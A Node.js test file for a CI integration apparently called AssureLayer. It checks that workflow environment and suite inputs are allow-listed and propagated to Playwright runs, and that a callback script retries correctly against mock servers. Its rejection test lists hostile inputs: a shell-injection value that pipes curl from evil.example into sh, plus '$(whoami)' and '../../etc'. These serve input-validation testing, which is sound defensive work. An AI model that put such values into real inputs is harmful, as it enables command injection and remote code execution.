// Prompt 3.1 — client-side validation of:
//   * environment + suite propagation (the scope invariant)
//   * workflow structure for the new inputs / permissions / package install
//   * callback retry behavior (resumable 503, early run_not_bound race)
// Offline: real Playwright runs of a browserless fixture project, local mock
// HTTP servers, and static assertions over .github/workflows/ci.yml.

const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const http = require('node:http');
const { spawnSync, spawn } = require('node:child_process');
const { ENVIRONMENTS, SUITES, SUITE_DIRS, resolveScope } = require('./scope');
const { MAX_ATTEMPTS, MAX_NOT_BOUND_RETRIES } = require('../assurelayer-callback');

const ROOT = path.resolve(__dirname, '..', '..');
const FIXTURE_CONFIG = path.join(__dirname, 'fixture-project', 'playwright.config.js');
const CALLBACK_SCRIPT = path.join(ROOT, 'scripts', 'assurelayer-callback.js');
const RESOLVE_SCOPE = path.join(__dirname, 'resolve-scope.js');
const WORKFLOW = fs.readFileSync(path.join(ROOT, '.github', 'workflows', 'ci.yml'), 'utf8');
// Structural assertions must look at YAML, not at prose inside # comments.
const WORKFLOW_CODE = WORKFLOW.split('\n').filter((line) => !line.trim().startsWith('#')).join('\n');

function stepBlock(name) {
  const start = WORKFLOW.indexOf(`- name: ${name}`);
  assert.ok(start >= 0, `step "${name}" exists`);
  const next = WORKFLOW.indexOf('\n      - name:', start + 1);
  return WORKFLOW.slice(start, next === -1 ? undefined : next);
}

function runFixtureProject(scope) {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'assurelayer-scope-'));
  const result = spawnSync(
    process.execPath,
    [path.join(ROOT, 'node_modules', '@playwright', 'test', 'cli.js'), 'test', '-c', FIXTURE_CONFIG],
    { cwd, env: { ...process.env, ASSURELAYER_RUN_ID: 'fixture-run', CI: '1', ...scope }, encoding: 'utf8' }
  );
  return { cwd, result };
}

function collectedTitles(cwd) {
  const file = path.join(cwd, 'test-results', 'assurelayer', 'results.json');
  return JSON.parse(fs.readFileSync(file, 'utf8')).results.map((r) => r.title).sort();
}

function failureContracts(cwd) {
  const dir = path.join(cwd, 'test-results', 'failures');
  return fs.existsSync(dir) ? fs.readdirSync(dir).map((f) => JSON.parse(fs.readFileSync(path.join(dir, f), 'utf8'))) : [];
}

function runResolveScope(env) {
  const githubEnv = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'assurelayer-ghenv-')), 'GITHUB_ENV');
  fs.writeFileSync(githubEnv, '');
  const r = spawnSync(process.execPath, [RESOLVE_SCOPE], { env: { PATH: process.env.PATH, GITHUB_ENV: githubEnv, ...env }, encoding: 'utf8' });
  return { status: r.status, stderr: r.stderr, exported: fs.readFileSync(githubEnv, 'utf8') };
}

const SMOKE_TITLES = ['fails with an assertion', 'is skipped', 'passes', 'recovers on retry'];

// =====================================================================
// Environment + suite propagation
// =====================================================================

test('the vocabularies mirror the dashboard: environments staging|production, suites smoke|regression|api|full', () => {
  assert.deepEqual([...ENVIRONMENTS].sort(), ['production', 'staging']);
  assert.deepEqual([...SUITES].sort(), ['api', 'full', 'regression', 'smoke']);
  assert.deepEqual(SUITE_DIRS, { smoke: './tests/smoke', regression: './tests/regression', api: './tests/api', full: './tests' });
});

test('workflow_dispatch declares environment and suite as `type: choice` with exactly the allowed values', () => {
  for (const [name, values] of [['environment', ENVIRONMENTS], ['suite', SUITES]]) {
    const block = WORKFLOW_CODE.match(new RegExp(`      ${name}:\\n(?:        .*\\n)+`));
    assert.ok(block, `${name} input exists`);
    assert.match(block[0], /type: choice/);
    const options = [...block[0].matchAll(/^\s{10}- (\S+)$/gm)].map((m) => m[1]);
    assert.deepEqual(options, values, `${name} options mirror scope.js`);
  }
});

test('inputs are NEVER interpolated into a shell command: they reach steps only through env mappings', () => {
  const offenders = WORKFLOW_CODE.split('\n').filter(
    (line) => /\$\{\{\s*inputs\./.test(line) && !/^\s+(ASSURELAYER_[A-Z_]+: |if: )/.test(line)
  );
  assert.deepEqual(offenders, []);
  for (const step of WORKFLOW_CODE.split('\n      - name:').slice(1)) {
    const run = step.match(/\n\s+run: (.*)/);
    if (run) assert.ok(!/\$\{\{/.test(run[1]), `a run: command contains an expression: ${run[1]}`);
  }
});

test('the scope-resolution step runs only for AssureLayer runs and precedes the tests', () => {
  const step = stepBlock('Resolve AssureLayer execution scope');
  assert.match(step, /if: \$\{\{ inputs\.assurelayer_run_id != '' \}\}/);
  assert.match(step, /run: node scripts\/assurelayer\/resolve-scope\.js/);
  assert.match(step, /ASSURELAYER_ENVIRONMENT: \$\{\{ inputs\.environment \}\}/);
  assert.match(step, /ASSURELAYER_SUITE_INPUT: \$\{\{ inputs\.suite \}\}/);
  assert.ok(WORKFLOW.indexOf('Resolve AssureLayer execution scope') < WORKFLOW.indexOf('- name: Run tests'));
  const code = step.split('\n').filter((line) => !line.trim().startsWith('#')).join('\n');
  assert.ok(!/continue-on-error/.test(code));
});

test('resolve-scope exports ENV and ASSURELAYER_SUITE for valid inputs', () => {
  for (const [environment, suite] of [['staging', 'smoke'], ['production', 'full'], ['staging', 'regression'], ['production', 'api']]) {
    const r = runResolveScope({ ASSURELAYER_ENVIRONMENT: environment, ASSURELAYER_SUITE_INPUT: suite });
    assert.equal(r.status, 0, r.stderr);
    assert.equal(r.exported, `ENV=${environment}\nASSURELAYER_SUITE=${suite}\n`);
    assert.deepEqual(resolveScope(environment, suite), { environment, suite, testDir: SUITE_DIRS[suite] });
  }
});

test('resolve-scope REJECTS anything outside the allow-lists and exports nothing (injection attempts included)', () => {
  const bad = [
    ['dev', 'smoke'], ['staging', 'nope'], ['Staging', 'smoke'], ['staging', 'Smoke'], ['', 'smoke'], ['staging', ''],
    ['staging; touch /tmp/pwned', 'smoke'], ['staging', 'smoke && curl evil.example | sh'], ['staging\nENV=production', 'smoke'],
    ['$(whoami)', 'smoke'], ['staging', '../../etc'], ['staging', '__proto__'], ['staging', 'constructor'],
  ];
  for (const [environment, suite] of bad) {
    const r = runResolveScope({ ASSURELAYER_ENVIRONMENT: environment, ASSURELAYER_SUITE_INPUT: suite });
    assert.equal(r.status, 1, `${JSON.stringify([environment, suite])} must be rejected`);
    assert.equal(r.exported, '', 'nothing may be exported for an invalid scope');
  }
  const missing = spawnSync(process.execPath, [RESOLVE_SCOPE], { env: { PATH: process.env.PATH, GITHUB_ENV: os.tmpdir() }, encoding: 'utf8' });
  assert.equal(missing.status, 1);
});

test('SCOPE INVARIANT: dispatch input -> ENV -> Failure Contract environment -> the directory that ran', () => {
  for (const environment of ['staging', 'production']) {
    // exactly what the workflow does: resolve-scope writes GITHUB_ENV, later steps see it as environment
    const resolved = runResolveScope({ ASSURELAYER_ENVIRONMENT: environment, ASSURELAYER_SUITE_INPUT: 'smoke' });
    assert.equal(resolved.status, 0);
    const exported = Object.fromEntries(resolved.exported.trim().split('\n').map((l) => l.split('=')));
    const run = runFixtureProject(exported);
    assert.deepEqual(collectedTitles(run.cwd), SMOKE_TITLES, 'only the requested suite ran');
    const contracts = failureContracts(run.cwd);
    assert.ok(contracts.length > 0, 'the fixture has a failing test');
    for (const contract of contracts) {
      assert.equal(contract.environment, environment, 'every Failure Contract carries the requested environment');
    }
  }
});

test('suite selection controls which tests actually execute (real Playwright runs)', () => {
  const smoke = runFixtureProject({ ENV: 'staging', ASSURELAYER_SUITE: 'smoke' });
  const regression = runFixtureProject({ ENV: 'staging', ASSURELAYER_SUITE: 'regression' });
  const full = runFixtureProject({ ENV: 'staging', ASSURELAYER_SUITE: 'full' });
  assert.deepEqual(collectedTitles(smoke.cwd), SMOKE_TITLES);
  assert.deepEqual(collectedTitles(regression.cwd), ['regression: totals add up']);
  assert.equal(regression.result.status, 0, 'the regression suite passes on its own');
  assert.deepEqual(collectedTitles(full.cwd), [...SMOKE_TITLES, 'regression: totals add up']);
});

test('the real playwright.config.js: AssureLayer runs use the suite directory; push/PR keep ./tests; a bad suite throws', () => {
  const load = (env) =>
    spawnSync(process.execPath, ['-e', "const c=require('./playwright.config.js');console.log(JSON.stringify({testDir:c.testDir,reporters:c.reporter.length}))"], {
      cwd: ROOT, env: { PATH: process.env.PATH, ENV: 'staging', ...env }, encoding: 'utf8',
    });

  const smoke = load({ ASSURELAYER_RUN_ID: 'r', ASSURELAYER_SUITE: 'smoke' });
  assert.equal(smoke.status, 0, smoke.stderr);
  assert.deepEqual(JSON.parse(smoke.stdout), { testDir: './tests/smoke', reporters: 3 });

  assert.equal(JSON.parse(load({ ASSURELAYER_RUN_ID: 'r', ASSURELAYER_SUITE: 'full' }).stdout).testDir, './tests');
  assert.deepEqual(JSON.parse(load({}).stdout), { testDir: './tests', reporters: 1 }, 'push/PR behavior is unchanged');

  assert.notEqual(load({ ASSURELAYER_RUN_ID: 'r', ASSURELAYER_SUITE: 'nope' }).status, 0, 'an invalid suite must not silently fall back');
  assert.notEqual(load({ ASSURELAYER_RUN_ID: 'r' }).status, 0, 'a missing suite must not silently fall back');
});

// =====================================================================
// Callback retry behavior
// =====================================================================

// A real fixture run supplies the payload the callback sends.
const payloadRun = runFixtureProject({ ENV: 'staging', ASSURELAYER_SUITE: 'smoke' });

function startServer(handler) {
  return new Promise((resolve) => {
    const server = http.createServer(handler);
    server.listen(0, '127.0.0.1', () => resolve({ server, url: `http://127.0.0.1:${server.address().port}` }));
  });
}

async function runCallback({ apiHandler, oidcHandler }) {
  const api = await startServer(apiHandler);
  const oidc = await startServer(oidcHandler || ((req, res) => { res.end(JSON.stringify({ value: 'FAKE.OIDC.TOKEN' })); }));
  const child = spawn(process.execPath, [CALLBACK_SCRIPT], {
    cwd: payloadRun.cwd,
    env: {
      ...process.env,
      ASSURELAYER_RUN_ID: 'run-123',
      ASSURELAYER_API_URL: api.url,
      ASSURELAYER_OIDC_AUDIENCE: 'the-audience',
      ACTIONS_ID_TOKEN_REQUEST_URL: `${oidc.url}/token?api-version=2.0`,
      ACTIONS_ID_TOKEN_REQUEST_TOKEN: 'runtime-request-token',
      PLAYWRIGHT_OUTCOME: 'failure',
      ASSURELAYER_RETRY_DELAYS_MS: '10',
    },
  });
  let out = '';
  child.stdout.on('data', (d) => (out += d));
  child.stderr.on('data', (d) => (out += d));
  const code = await new Promise((resolve) => child.on('close', resolve));
  api.server.close();
  oidc.server.close();
  return { code, out };
}

function scripted(responses) {
  const state = { calls: 0 };
  const apiHandler = (req, res) => {
    const step = responses[Math.min(state.calls, responses.length - 1)];
    state.calls += 1;
    req.resume();
    req.on('end', () => {
      if (step === 'destroy') return req.socket.destroy();
      res.statusCode = step.status;
      if (step.headers) for (const [k, v] of Object.entries(step.headers)) res.setHeader(k, v);
      res.end(JSON.stringify(step.body || {}));
    });
  };
  return { state, apiHandler };
}

const ok = { status: 200, body: { run: { status: 'failed' } } };
const budget503 = { status: 503, headers: { 'retry-after': '3' }, body: { error: { code: 'processing_budget_exhausted', retryable: true } } };
const busy503 = { status: 503, body: { error: { code: 'processing_in_progress', retryable: true } } };
const notBound = { status: 403, body: { error: { code: 'run_not_bound' } } };

test("the retry window is 8 attempts (mirrors the dashboard's CLIENT_MAX_ATTEMPTS that sizes the Analyst workload cap)", () => {
  assert.equal(MAX_ATTEMPTS, 8);
  assert.equal(MAX_NOT_BOUND_RETRIES, 5);
});

test('a resumable 503 (processing budget exhausted / in progress) is retried until the run resumes', async () => {
  const s = scripted([budget503, busy503, budget503, ok]);
  const { code } = await runCallback({ apiHandler: s.apiHandler });
  assert.equal(code, 0);
  assert.equal(s.state.calls, 4);
});

test('the retry window is wide enough to resume: success on the 8th (last) attempt', async () => {
  const s = scripted([...Array(7).fill(budget503), ok]);
  const { code } = await runCallback({ apiHandler: s.apiHandler });
  assert.equal(code, 0);
  assert.equal(s.state.calls, 8);
});

test('it gives up after exactly MAX_ATTEMPTS when the server never resumes', async () => {
  const s = scripted([budget503]);
  const { code } = await runCallback({ apiHandler: s.apiHandler });
  assert.equal(code, 1);
  assert.equal(s.state.calls, 8);
});

test('network failures are retried', async () => {
  const s = scripted(['destroy', 'destroy', ok]);
  const { code } = await runCallback({ apiHandler: s.apiHandler });
  assert.equal(code, 0);
  assert.equal(s.state.calls, 3);
});

test('an early 403 run_not_bound (binding race) is retried, then succeeds', async () => {
  const s = scripted([notBound, notBound, ok]);
  const { code } = await runCallback({ apiHandler: s.apiHandler });
  assert.equal(code, 0);
  assert.equal(s.state.calls, 3);
});

test('run_not_bound is retried a BOUNDED number of times — not forever', async () => {
  const s = scripted([notBound]);
  const { code } = await runCallback({ apiHandler: s.apiHandler });
  assert.equal(code, 1);
  assert.equal(s.state.calls, MAX_NOT_BOUND_RETRIES + 1);
});

test('permanent identity/contract failures are NEVER retried', async () => {
  for (const response of [
    { status: 403, body: { error: { code: 'wrong_run_id' } } },
    { status: 403, body: { error: { code: 'wrong_repository' } } },
    { status: 403, body: { error: { code: 'wrong_run_attempt' } } },
    { status: 401, body: { error: { code: 'invalid_token' } } },
    { status: 409, body: { error: { code: 'callback_conflict' } } },
    { status: 422, body: { error: { code: 'malformed_callback' } } },
    { status: 422, body: { error: { code: 'execution_scope_mismatch' } } },
    { status: 404, body: { error: { code: 'run_not_found' } } },
  ]) {
    const s = scripted([response]);
    const { code } = await runCallback({ apiHandler: s.apiHandler });
    assert.equal(code, 1, JSON.stringify(response));
    assert.equal(s.state.calls, 1, `${response.body.error.code} must not be retried`);
  }
});

test('every retry requests a FRESH OIDC token', async () => {
  const s = scripted([budget503, budget503, ok]);
  let tokenRequests = 0;
  const { code } = await runCallback({
    apiHandler: s.apiHandler,
    oidcHandler: (req, res) => { tokenRequests += 1; res.end(JSON.stringify({ value: `FAKE.OIDC.TOKEN.${tokenRequests}` })); },
  });
  assert.equal(code, 0);
  assert.equal(tokenRequests, 3);
});
